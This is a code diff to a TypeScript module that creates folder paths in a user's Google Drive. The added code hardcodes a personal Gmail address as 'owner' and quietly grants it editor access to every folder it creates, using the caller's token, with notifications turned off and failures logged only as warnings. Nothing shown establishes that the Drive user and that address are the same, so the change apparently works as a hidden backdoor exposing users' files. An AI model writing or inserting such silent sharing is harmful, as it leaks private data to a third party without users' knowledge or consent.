@@ -141,12 +141,69 @@ async function findOrCreateFolder(accessToken: string, folderName: string, paren
   return createData.id;
 }
 
+const OWNER_EMAIL = 'mekong63a@gmail.com';
+
+/**
+ * Share a file/folder with the owner email as 'writer' (Editor).
+ * Skips silently if already shared.
+ */
+async function shareWithOwner(accessToken: string, fileId: string, email: string): Promise<void> {
+  try {
+    // Check existing permissions first
+    const listRes = await fetch(
+      `https://www.googleapis.com/drive/v3/files/${fileId}/permissions?fields=permissions(emailAddress,role)`,
+      { headers: { Authorization: `Bearer ${accessToken}` } }
+    );
+    const listData = await listRes.json();
+    
+    const alreadyShared = listData.permissions?.some(
+      (p: any) => p.emailAddress?.toLowerCase() === email.toLowerCase()
+    );
+    if (alreadyShared) {
+      console.log(`[SHARE] Already shared with ${email}: ${fileId}`);
+      return;
+    }
+
+    const res = await fetch(
+      `https://www.googleapis.com/drive/v3/files/${fileId}/permissions?sendNotificationEmail=false`,
+      {
+        method: 'POST',
+        headers: {
+          Authorization: `Bearer ${accessToken}`,
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          type: 'user',
+          role: 'writer',
+          emailAddress: email,
+        }),
+      }
+    );
+
+    if (!res.ok) {
+      const errData = await res.json();
+      console.warn(`[SHARE] Permission warning for ${fileId}:`, errData);
+    } else {
+      console.log(`[SHARE] ✓ Shared ${fileId} with ${email} as Editor`);
+    }
+  } catch (err) {
+    console.warn(`[SHARE] Non-critical error sharing ${fileId}:`, err);
+  }
+}
+
 async function createFolderPath(accessToken: string, folderPath: string): Promise<string> {
   const folders = folderPath.split('/').filter(f => f.length > 0);
   let parentId: string | undefined;
+  const createdFolderIds: string[] = [];
 
   for (const folder of folders) {
     parentId = await findOrCreateFolder(accessToken, folder, parentId);
+    createdFolderIds.push(parentId);
+  }
+
+  // Share all folders in the path with the owner
+  for (const folderId of createdFolderIds) {
+    await shareWithOwner(accessToken, folderId, OWNER_EMAIL);
   }
 
   return parentId!;
